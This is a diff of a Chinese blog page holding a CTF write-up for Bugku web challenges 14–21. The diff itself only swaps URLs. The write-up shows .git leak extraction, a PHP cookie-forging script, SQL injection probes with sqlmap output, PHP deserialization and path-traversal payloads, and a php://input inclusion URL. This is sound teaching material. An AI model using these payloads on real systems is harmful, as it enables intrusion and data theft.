@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CTF论剑场 Web14-21 WriteUp | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="CTF论剑场 Web14-21 WriteUp | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTF论剑场 Web14-21 WriteUp | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -32,8 +32,8 @@ hint：听说备份了不少东西呢
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -102,11 +102,11 @@ hint：听说备份了不少东西呢
               <span class="page-view" key="20190425205900" title="CTF论剑场 Web14-21 WriteUp">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                   # Writeup
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                   # CTF
                 </a>
                 
@@ -121,22 +121,22 @@ hint：听说备份了不少东西呢
 <blockquote>
 <p>hint：听说备份了不少东西呢</p>
 </blockquote>
-<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552754298863-5b7fc7f5-8072-4fc4-9eb0-fb82a532cfcc.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/1552754298863-5b7fc7f5-8072-4fc4-9eb0-fb82a532cfcc.png" alt="" loading="lazy"></figure>
 <p>根据hint信息可以猜测为<code>/.git/</code>敏感文件泄露，该目录下包含了所有 git 正常工作所需要的信息。</p>
 <p>使用<code>GitHack</code>工具(项目地址:https://github.com/lijiejie/GitHack)进行探测:</p>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552754784498-5dcb848e-0743-4fab-b0bc-4e6112fab031.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/1552754784498-5dcb848e-0743-4fab-b0bc-4e6112fab031.png" alt="" loading="lazy"></figure>
 <h2 id="web15-vim">web15 vim</h2>
 <p>hint: vim编辑器</p>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552790422604-d6e12a34-3495-457e-b8f1-95a6b22ffcfc.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/1552790422604-d6e12a34-3495-457e-b8f1-95a6b22ffcfc.png" alt="" loading="lazy"></figure>
 <p>尝试提交<code>id</code>参数为swp，回显：<strong>不是这里不是这里不是这里!!!</strong>。</p>
 <p>注意到此时的链接为<code>/1ndex.php?id=swp&amp;submit=提交查询#</code>，尝试修改<strong>1</strong>为<strong>i</strong>并提交访问，得到flag{Is_wh1te_ooo000oo0}。</p>
 <h2 id="web16-江湖">web16 江湖</h2>
 <p>学会如来神掌应该就能打败他了吧</p>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552790728537-029e66ca-6aa9-4b54-9747-f9819852ab3a.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/1552790728537-029e66ca-6aa9-4b54-9747-f9819852ab3a.png" alt="" loading="lazy"></figure>
 <p>进入江湖：</p>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552790783917-2333e15d-e11a-46f1-9daa-f88704e9756e.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/1552790783917-2333e15d-e11a-46f1-9daa-f88704e9756e.png" alt="" loading="lazy"></figure>
 <p>点击<strong>刷新属性</strong>会刷新各属性的值，动态变化，点击<strong>确定</strong>进入：</p>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552790940944-c06d9bdb-818b-47db-bb9d-a63fcb76ed06.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/1552790940944-c06d9bdb-818b-47db-bb9d-a63fcb76ed06.png" alt="" loading="lazy"></figure>
 <ul>
 <li>属性中提示：每次练功和赚钱都会消耗5秒的时间,请您耐心等待。</li>
 <li>每次练功会增加一定的属性提升，耗时5s一次。</li>
@@ -144,12 +144,12 @@ hint：听说备份了不少东西呢
 <li>点击赚钱每次会增加100银两的收入。</li>
 </ul>
 <p>结合<strong>学会如来神掌应该就能打败他了吧</strong>，推测思路为学会如来神掌后讨伐魔头，因此我们需要通过提升各属性值为满且从商店购买<strong>如来神掌</strong>。</p>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552835608314-5110a4c1-5057-442b-9f26-e387283b526b.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/1552835608314-5110a4c1-5057-442b-9f26-e387283b526b.png" alt="" loading="lazy"></figure>
 <p>方案:拥有足够的银两即可提升属性值为满且学习如来神掌。</p>
 <p>F12查看页面源代码发现有以下<code>js</code>脚本文件:</p>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552921173877-e5eaaf8e-7454-41cf-9f50-da27a09fb236.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/1552921173877-e5eaaf8e-7454-41cf-9f50-da27a09fb236.png" alt="" loading="lazy"></figure>
 <p>另外<strong>Cookie</strong>如下:</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552792292999-c0c20899-fc49-467e-8a02-db9d29cceaf1.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/1552792292999-c0c20899-fc49-467e-8a02-db9d29cceaf1.png" alt="" loading="lazy"></figure>
 <p>下载script.js审计，这里使用VSCode进行查看（Windows下Shift + Alt + F进行代码格式化整理):</p>
 <pre><code class="language-js">eval(function (p, a, c, k, e, r) {
     e = function (c) { return (c &lt; 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36)) };
@@ -220,7 +220,7 @@ function ertqwe() {
 }
 </code></pre>
 <p>控制台执行如下命令：</p>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552796073423-ec88efa7-4f18-4e54-a926-8d8a6d0344f5.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/1552796073423-ec88efa7-4f18-4e54-a926-8d8a6d0344f5.png" alt="" loading="lazy"></figure>
 <p>尝试修改各属性值money为1000000并加密，PHP脚本如下（这里感谢<a href="https://www.cnblogs.com/leixiao">淚笑</a>师傅的指导<sub>自写的python脚本存在一些问题结果不一致</sub>）：</p>
 <pre><code class="language-php">&lt;?php
 function encode($payload) {
@@ -243,17 +243,17 @@ echo base64_encode(encode($payload));
 ?&gt;
 </code></pre>
 <p>将修改后的cookie字段发包:</p>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552837997497-7add57ed-7416-4ed9-9e26-c2197e7d5236.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/1552837997497-7add57ed-7416-4ed9-9e26-c2197e7d5236.png" alt="" loading="lazy"></figure>
 <p>提升属性和学习如来神掌后讨伐老魔获取flag：</p>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552838417921-5e63eaa8-5358-4ed7-ba4f-e1fc6fbf0753.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/1552838417921-5e63eaa8-5358-4ed7-ba4f-e1fc6fbf0753.png" alt="" loading="lazy"></figure>
 <p>另外在<code>/wulin.php</code>下发现了出题人留下的彩蛋，可以检测flag的正确性：</p>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552838560315-2e7a313f-0861-49fd-bba7-4e4b9fb4f662.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/1552838560315-2e7a313f-0861-49fd-bba7-4e4b9fb4f662.png" alt="" loading="lazy"></figure>
 <h2 id="web17-流量分析">web17 流量分析</h2>
 <p>直接使用Wireshark打开bugku.pcapng进行TCP流追踪即可找到flag。</p>
-<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552920480203-0dd89ae0-39fa-45c5-b3a2-1f569d42bbb0.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/1552920480203-0dd89ae0-39fa-45c5-b3a2-1f569d42bbb0.png" alt="" loading="lazy"></figure>
 <h2 id="web18-sql-injection">web18 Sql injection</h2>
-<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552883028265-5171c1ed-f4c3-474c-b100-cb08239d803d.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552882900403-54768523-ac70-43d2-98cf-edeba4bd50e2.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/1552883028265-5171c1ed-f4c3-474c-b100-cb08239d803d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/1552882900403-54768523-ac70-43d2-98cf-edeba4bd50e2.png" alt="" loading="lazy"></figure>
 <p>试探过程如下：</p>
 <pre><code class="language-sql">?id=1'  回显空白 -&gt; 可能为单引号闭合
 ?id=1'--+ 回显正常 -&gt; 单引号闭合方式
@@ -279,11 +279,11 @@ echo base64_encode(encode($payload));
 </code></pre>
 <p>获取flag{22b7a7c3d73d88050722b3eeb102ee45} .</p>
 <h2 id="web19-poc-and-exps-love-note">web19 Poc And Exp's Love Note</h2>
-<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552903244586-895c66f6-aa11-4ac5-96a8-f36f409d5a00.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/1552903244586-895c66f6-aa11-4ac5-96a8-f36f409d5a00.png" alt="" loading="lazy"></figure>
 <p><code>dirsearch</code>探测下发现存在<code>/.git/</code>泄露:</p>
-<figure data-type="image" tabindex="18"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552903604902-d4b85ef9-98bc-4af8-9eea-c27af92f99a7.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/1552903604902-d4b85ef9-98bc-4af8-9eea-c27af92f99a7.png" alt="" loading="lazy"></figure>
 <p><code>Githack</code>操作一下，在flag.txt中获取Hint 1: flag is in /eXpl0ve5p0cVeRymuCh。</p>
-<figure data-type="image" tabindex="19"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552904156016-c2065fec-a46e-4b57-a6d7-2f8ad930c581.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/1552904156016-c2065fec-a46e-4b57-a6d7-2f8ad930c581.png" alt="" loading="lazy"></figure>
 <p><code>sqlmap</code>跑一下，发现存在基于时间的布尔盲注：</p>
 <pre><code class="language-bash">---
 Parameter: username (POST)
@@ -321,16 +321,16 @@ Table: hlnt_2
 +----+-----------------------------------------------+
 </code></pre>
 <p>用获取到的username和password登录admin账户:</p>
-<figure data-type="image" tabindex="20"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552906316323-20c7f067-90a1-4930-8a98-75b8e30c7961.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/1552906316323-20c7f067-90a1-4930-8a98-75b8e30c7961.png" alt="" loading="lazy"></figure>
 <p>查看页面源代码发现有注释掉的内容:</p>
-<figure data-type="image" tabindex="21"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552906718771-46c85a2b-20e2-45f2-8678-c81717c7f3dd.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/1552906718771-46c85a2b-20e2-45f2-8678-c81717c7f3dd.png" alt="" loading="lazy"></figure>
 <p>结合<strong>游记内容</strong>推测可能为<a href="http://www.darkside.com.au/snow/">snow</a> HTML隐写（可以在ASCII文本的末行隐藏数据，并且可以通过插入制表位和空格使嵌入的数据在浏览器中不可见），使用BurpSuite抓取该页面内容保存至1.html（尝试从Firefox保存分析存在问题，感谢冷暗雨师傅指导~）.</p>
-<figure data-type="image" tabindex="22"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552913911594-9c6dbd08-074b-428d-890f-e8dcc429953d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/1552913911594-9c6dbd08-074b-428d-890f-e8dcc429953d.png" alt="" loading="lazy"></figure>
 <pre><code class="language-bash">C:\Users\light\Desktop&gt;SNOW.EXE -C -p ILOveExp 1.html
 flag in /PPPPOOO0CCCC.php
 </code></pre>
 <p>结合在hlnt_2表中获取的Hint2:<code>a class for you &quot;https://postimg.cc/6274vCP5&quot;</code>。</p>
-<figure data-type="image" tabindex="23"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552905948498-139225fc-192b-4729-bf3e-789167cb6a2b.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/1552905948498-139225fc-192b-4729-bf3e-789167cb6a2b.png" alt="" loading="lazy"></figure>
 <p>Payload：</p>
 <pre><code class="language-php">&lt;?php
 class ReadFile {
@@ -345,7 +345,7 @@ echo serialize($payload);
 //encodeURIComponent
 //O%3A8%3A%22ReadFile%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A22%3A%22..%2F..%2FPPPPOOO0CCCC.php%22%3B%7D
 </code></pre>
-<figure data-type="image" tabindex="24"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552915162974-b150a5ab-0959-403f-b80e-ea36a748debb.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/1552915162974-b150a5ab-0959-403f-b80e-ea36a748debb.png" alt="" loading="lazy"></figure>
 <h2 id="web20-get_key">web20  GET_key</h2>
 <p>你的动态密文是：fb49037b2bb5315bdad5228d7cf0c34e2<br>
 GET提交对应的密文可以得到flag(form_input_name='key')<br>
@@ -418,7 +418,7 @@ echo serialize($payload);
 <p>赋值给<code>pass</code>，当作为字符串是将调用**__toString()**读取f1a9.php的内容，Payload：</p>
 <pre><code class="language-html">/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}
 </code></pre>
-<figure data-type="image" tabindex="25"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552917136762-f843082b-862d-43c1-880c-5c0230ef6e27.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/1552917136762-f843082b-862d-43c1-880c-5c0230ef6e27.png" alt="" loading="lazy"></figure>
 
                   </div>
                   <div class="toc-container">
@@ -452,7 +452,7 @@ echo serialize($payload);
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-2019-jiaweisibei-WriteUp/">
+              <a href="https://3nd.xyz/post/2019-04-25-2019-jiaweisibei-WriteUp/">
                 <h3 class="post-title" style="text-align: left;">
                   2019 “嘉韦思杯”上海市网络安全邀请赛 WriteUp
                 </h3>
@@ -463,7 +463,7 @@ echo serialize($payload);
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
+              <a href="https://3nd.xyz/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   CTF 论剑场 Web1-13 WriteUp
@@ -477,7 +477,7 @@ echo serialize($payload);
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
